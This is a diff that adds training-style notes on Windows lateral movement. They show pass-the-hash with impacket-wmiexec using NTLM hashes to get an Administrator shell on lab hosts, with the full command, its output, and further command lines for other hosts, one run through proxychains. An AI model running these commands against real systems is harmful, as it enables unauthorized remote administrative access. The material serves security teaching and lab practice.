@@ -1,1 +1,23 @@
+We can also use one of the other impacket scripts like wmiexec.py to obtain a shell as the user we used for authentication.
+On Kali, we would use impacket-wmiexec along with the arguments we used for impacket-psexec.
 
+impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+
+kali@kali:~$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+files02\administrator
+C:\>
+    Listing 46 - Using wmiexec to get an interactive shell
+
+As the whoami output shows, we obtained a shell as the Administrator user with wmiexec instead of SYSTEM.
+In this section, we used pass-the-hash to gain access to an SMB share. 
+We then used the hash to obtain an interactive shell with impacket-psexec and impacket-wmiexec.
+
+kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+
+└─$ proxychains /usr/bin/impacket-wmiexec -hashes :4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.121.140  
